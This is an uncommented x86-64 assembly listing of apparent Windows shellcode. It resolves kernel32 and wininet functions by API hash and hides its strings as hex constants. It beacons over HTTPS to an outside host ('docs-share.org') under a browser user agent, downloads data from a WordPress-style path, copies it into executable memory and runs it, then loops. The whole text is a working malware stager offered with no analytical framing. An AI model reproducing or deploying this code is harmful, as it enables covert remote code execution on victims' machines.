start:
    cld
    mov rbp, rsp
    sub rsp, 4096
    and rsp, 0xFFFFFFFFFFFFFFF0

resolve_kernel32:
    mov rcx, 0x60
    mov r8, qword ptr gs:[rcx]
    mov rdi, [r8 + 0x18]
    mov rdi, [rdi + 0x30]

search_kernel32:
    mov rbx, [rdi + 0x10]
    mov rsi, [rdi + 0x40]
    mov rdi, [rdi]

    cmp byte ptr [rsi + 24], 0
    jne search_kernel32
    
    mov dl, 0x4b
    cmp byte ptr [rsi], dl
    jne search_kernel32

    mov r12, rbx

    mov rcx, r12
    mov r8d, 0xec0e4e8e
    call lookup_api
    mov [rbp - 8], rax

    mov rcx, r12
    mov r8d, 0x91afca54
    call lookup_api
    mov [rbp - 16], rax

    mov rcx, r12
    mov r8d, 0xdb2d49b0
    call lookup_api
    mov [rbp - 24], rax

    mov rcx, r12
    mov r8d, 0x73e2d87e
    call lookup_api
    mov [rbp - 32], rax

load_wininet:
    mov rax, 0x2e74656e696e6977
    mov [rbp - 128], rax
    mov eax, 0x006c6c64
    mov [rbp - 120], eax
    
    lea rcx, [rbp - 128]
    sub rsp, 32
    call [rbp - 8]
    add rsp, 32
    
    mov r13, rax

    mov rcx, r13
    mov r8d, 0x57e84429
    call lookup_api
    mov [rbp - 40], rax

    mov rcx, r13
    mov r8d, 0x1e4be80e
    call lookup_api
    mov [rbp - 48], rax

    mov rcx, r13
    mov r8d, 0xf7de769f
    call lookup_api
    mov [rbp - 56], rax

    mov rcx, r13
    mov r8d, 0x2de6be9d
    call lookup_api
    mov [rbp - 64], rax

    mov rcx, r13
    mov r8d, 0x5fe34b8b
    call lookup_api
    mov [rbp - 72], rax

    mov rcx, r13
    mov r8d, 0xfa9b69c7
    call lookup_api
    mov [rbp - 80], rax

internet_open:
    mov rax, 0x2f616c6c697a6f4d
    mov [rbp - 128], rax
    mov eax, 0x00302e35
    mov [rbp - 120], eax
    lea rax, [rbp - 128]

    xor r9, r9
    xor r8, r8
    xor rdx, rdx
    mov rcx, rax                
    
    sub rsp, 48
    mov qword ptr [rsp + 32], r9
    call [rbp - 40]
    add rsp, 48
    
    test rax, rax
    jz exit_process
    mov r14, rax

c2_loop:
    mov rcx, 5000
    sub rsp, 32
    call [rbp - 24]
    add rsp, 32

internet_connect:
    mov rax, 0x6168732d73636f64
    mov [rbp - 128], rax
    mov rax, 0x0067726f2e6572
    mov [rbp - 120], rax
    lea rdx, [rbp - 128]

    mov rcx, r14
    mov r8, 443
    xor r9, r9
    
    sub rsp, 64
    mov qword ptr [rsp + 32], r9
    mov rax, 3
    mov qword ptr [rsp + 40], rax
    xor rax, rax
    mov qword ptr [rsp + 48], rax
    mov qword ptr [rsp + 56], rax

    call [rbp - 48]
    add rsp, 64
    
    test rax, rax
    jz c2_loop
    mov r15, rax

open_request:
    mov eax, 0x00544547
    mov dword ptr [rbp - 128], eax
    lea rdx, [rbp - 128]

    mov rax, 0x772f65726168732f
    mov [rbp - 176], rax
    mov rax, 0x6e65746e6f632d70
    mov [rbp - 168], rax
    mov rax, 0x2f73656c69662f74
    mov [rbp - 160], rax
    mov byte ptr [rbp - 152], 0
    lea r8, [rbp - 176]

    mov rcx, r15
    xor r9, r9
    
    sub rsp, 64
    mov qword ptr [rsp + 32], r9
    mov qword ptr [rsp + 40], r9
    mov eax, 0x84803000
    mov qword ptr [rsp + 48], rax
    mov qword ptr [rsp + 56], r9
    
    call [rbp - 56]
    add rsp, 64
    
    test rax, rax
    jz close_connect
    mov rbx, rax

send_request:
    mov rcx, rbx
    xor rdx, rdx
    xor r8, r8
    xor r9, r9
    
    sub rsp, 48
    mov qword ptr [rsp + 32], r9
    call [rbp - 64]
    add rsp, 48
    
    test eax, eax
    jz close_request

read_file:
    lea rdx, [rbp - 2048]
    mov rcx, rbx
    mov r8, 4096
    lea r9, [rbp - 200]
    
    sub rsp, 32
    call [rbp - 72]
    add rsp, 32
    
    test eax, eax
    jz free_buffer
    
    mov r12d, [rbp - 200]
    test r12, r12
    jz free_buffer
    
    xor rcx, rcx
    mov rdx, r12
    mov r8, 0x3000
    mov r9, 0x40
    sub rsp, 32
    call [rbp - 16]
    add rsp, 32
    
    test rax, rax
    jz free_buffer
    
    mov rdi, rax
    lea rsi, [rbp - 2048]
    mov rcx, r12
    rep movsb
    
    call rax
    
free_buffer:
    nop

close_request:
    mov rcx, rbx
    sub rsp, 32
    call [rbp - 80]
    add rsp, 32

close_connect:
    mov rcx, r15
    sub rsp, 32
    call [rbp - 80]
    add rsp, 32
    jmp c2_loop

exit_process:
    xor rcx, rcx
    sub rsp, 32
    call [rbp - 32]

lookup_api:
    push rbx
    push rdi
    push rsi
    push r12
    
    mov rbx, rcx
    mov eax, [rbx + 0x3C]
    mov edi, [rbx + rax + 0x88]
    add rdi, rbx
    
    mov ecx, [rdi + 0x18]
    mov eax, [rdi + 0x20]
    add rax, rbx
    mov r12, rax

lookup_loop:
    jecxz lookup_fail
    dec ecx
    
    mov esi, [r12 + rcx * 4]
    add rsi, rbx
    
    xor eax, eax
    xor edx, edx
calc_hash:
    lodsb
    test al, al
    jz check_hash
    ror edx, 13
    add edx, eax
    jmp calc_hash

check_hash:
    cmp edx, r8d
    jne lookup_loop
    
    mov eax, [rdi + 0x24]
    add rax, rbx
    movzx ecx, word ptr [rax + rcx * 2]
    
    mov eax, [rdi + 0x1C]
    add rax, rbx
    mov eax, [rax + rcx * 4]
    add rax, rbx
    
    pop r12
    pop rsi
    pop rdi
    pop rbx
    ret

lookup_fail:
    xor rax, rax
    pop r12
    pop rsi
    pop rdi
    pop rbx
    ret
